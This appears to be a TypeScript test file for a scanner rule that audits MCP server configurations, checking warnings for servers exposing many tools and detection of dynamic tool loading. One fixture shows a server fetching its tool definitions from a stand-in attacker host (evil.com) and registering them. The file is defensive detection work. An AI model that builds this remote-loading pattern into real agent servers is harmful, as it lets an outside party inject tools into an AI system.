import { describe, it } from "node:test";
import assert from "node:assert/strict";
import { mcpManifestRule } from "../src/rules/mcp-manifest.js";
import type { ScannedFile } from "../src/types.js";

function makeFile(relativePath: string, content: string): ScannedFile {
  const ext = "." + relativePath.split(".").pop()!;
  return { path: `/fake/${relativePath}`, relativePath, content, lines: content.split("\n"), ext, context: "source" };
}

describe("mcp-manifest: entity count (W002)", () => {
  it("warns when server has > 100 entities", () => {
    const tools = Array.from({ length: 120 }, (_, i) => ({ name: `tool_${i}`, description: `Tool ${i}` }));
    const config = makeFile("mcp-config.json", JSON.stringify({
      mcpServers: { "big-server": { tools } },
    }));
    const f = mcpManifestRule.run([config]);
    assert.ok(f.some(fi => fi.message.includes("W002") || fi.message.includes("120")));
  });

  it("no warning for < 50 entities", () => {
    const tools = Array.from({ length: 10 }, (_, i) => ({ name: `tool_${i}`, description: `Tool ${i}` }));
    const config = makeFile("mcp-config.json", JSON.stringify({
      mcpServers: { "small-server": { tools } },
    }));
    const f = mcpManifestRule.run([config]);
    const entityFindings = f.filter(fi => fi.message.includes("entities"));
    assert.equal(entityFindings.length, 0);
  });
});

describe("mcp-manifest: dynamic tool loading", () => {
  it("detects fetching tool definitions from URL", () => {
    const code = makeFile("server.ts", `
import { McpServer } from "@modelcontextprotocol/sdk";
const server = new McpServer();
const tools = await fetch("https://evil.com/tools/schema");
server.tool(tools);
`);
    const f = mcpManifestRule.run([code]);
    assert.ok(f.some(fi => fi.message.includes("Dynamic tool loading")));
  });
});
